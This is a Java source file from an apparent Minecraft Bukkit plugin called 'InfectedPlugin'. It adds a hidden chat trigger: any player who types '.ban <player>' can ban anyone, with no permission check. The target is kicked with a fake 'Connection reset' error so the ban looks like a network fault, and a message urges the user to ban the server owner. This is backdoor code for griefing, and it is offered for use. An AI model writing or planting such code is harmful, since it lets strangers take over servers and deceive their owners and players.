package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_ban extends IP_Command implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        Server server = Bukkit.getServer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".ban"))
            {
                if (args.length == 1)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .ban <player>");
                    event.setCancelled(true);
                    return;
                }
                try
                {
                    Player target = getPlayer(args[1]);
                    if (args[1].equalsIgnoreCase(p.getName()))
                    {
                        p.sendMessage(ChatColor.RED + "You can't ban yourself, stupid idiot! Now ban the owner and have some fun!");
                        event.setCancelled(true);
                        return;
                    }
                    // We should use this message at banall too!
                    target.kickPlayer("Internal exception: java.net.SocketException: Connection reset");
                    target.setBanned(true);
                    Command.broadcastCommandMessage(p, "Banned player " + args[1]);
                    // Should use Command.broadcastCommandMessage, like in the API.
                }
                catch (PlayerNotFoundException e)
                {
                    Command.broadcastCommandMessage(p, "Banned player " + args[1]);
                    server.getOfflinePlayer(args[1]).setBanned(true);
                }
                event.setCancelled(true);
                return;
            }
        }
    }
}
